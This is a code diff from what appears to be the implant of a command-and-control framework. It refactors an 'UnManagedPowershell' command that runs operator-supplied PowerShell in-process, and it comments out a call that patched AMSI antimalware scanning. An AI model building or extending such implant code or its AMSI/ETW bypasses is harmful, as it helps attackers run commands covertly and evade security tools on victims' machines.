@@ -14,6 +14,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Globalization;
 using Microsoft.Win32;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -21,7 +22,7 @@ namespace Engineer.Commands
     {
         public override string Name => "UnManagedPowershell";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             var stdOut = Console.Out;
             var stdErr = Console.Error;
@@ -39,10 +40,10 @@ namespace Engineer.Commands
 
                 //Patch_ETW patchetwObject = new Patch_ETW();
                 //Console.WriteLine(patchetwObject.Execute(null));
-                Patch_AMSI patchObject = new Patch_AMSI();
-                var pathrespopnse = patchObject.Execute(null);
-                pathrespopnse = pathrespopnse.Replace("error", "warning");
-                Console.WriteLine(pathrespopnse);
+                //Patch_AMSI patchObject = new Patch_AMSI();
+                //var pathrespopnse = patchObject.Execute(null);
+                //pathrespopnse = pathrespopnse.Replace("error", "warning");
+                //Console.WriteLine(pathrespopnse);
 
                 bool OutString = true;
                 task.Arguments.TryGetValue("/command", out string command);
@@ -101,11 +102,11 @@ namespace Engineer.Commands
                 ps.Commands.Clear();
                 ps.Dispose();
 
-                return output;
+                Tasking.FillTaskResults(output, task, EngTaskStatus.Complete);
             }
             catch (Exception ex)
             {
-                return "error: " + ex.Message;
+                Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed);
             }
             finally
             {
